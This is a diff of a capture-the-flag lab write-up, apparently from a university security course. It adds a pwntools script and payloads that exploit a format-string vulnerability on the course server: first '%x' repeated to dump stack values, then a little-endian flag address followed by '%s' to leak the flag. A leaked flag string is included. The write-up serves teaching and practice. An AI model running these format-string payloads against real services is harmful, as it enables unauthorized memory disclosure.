@@ -106,12 +106,16 @@ Since the guide provided a script for crafting the payload - "exploit_example.py
 from pwn import *
 
 p = remote("ctf-fsi.fe.up.pt", 4004)
-payload = bytearray.fromhex("A" * 8) + b"%x" * 100
+
+very_noticeable_value = 0xAABBCCDD
+payload = very_noticeable_value.to_bytes(4, byteorder='little') + b"%x" * 100
 
 p.recvuntil(b"got:")
 p.sendline(payload)
 p.interactive()
 ```
+
+**Note:** The 'b' before the string means the characters will be encoded as <u>octets</u> (integers ranging from 0 to 255), which is the format C uses for character encoding.
 
 Upon running the script, we obtained the following output:
 
@@ -124,3 +128,28 @@ While at first we were quite surprised by this, after giving it some more though
 > The **stack frame** of a function is laid out as follows, in ascending order of memory addresses: <u>local variables</u>, <u>frame pointer</u>, <u>return address</u> and <u>function parameters</u>.
 
 In fact, the stack frame of the `printf()` function would be located below the stack frame of the `main()` function. Since local variables are stored in the lower addresses, the value above `printf()` was none other than the only local variable `main()` declared - "buffer", the array used to store our input.
+
+Our next step was to discover the address of the "flag" array. Thankfully, using `gdb`, we only had to type the command below:
+
+![Alt text](images/7-3.png)
+
+With that figured out, we had all the information we needed to build our payload. We decided it would be the following:
+
+```python
+address = 0x804c060 # the address of "flag"
+payload = address.to_bytes(4, byteorder='little') + b"%s"
+```
+
+### Attack!
+
+We modified "exploit_example.py" so that it would send our payload to the server.
+
+```python
+p.sendline(payload)
+```
+
+Running "exploit_example.py", we got the following output:
+
+![Alt text](images/7-4.png)
+
+Just as we predicted, the program leaked the first flag: `flag{7a33d6062ce2c9f4c81dce9e92fdb6d5}`.
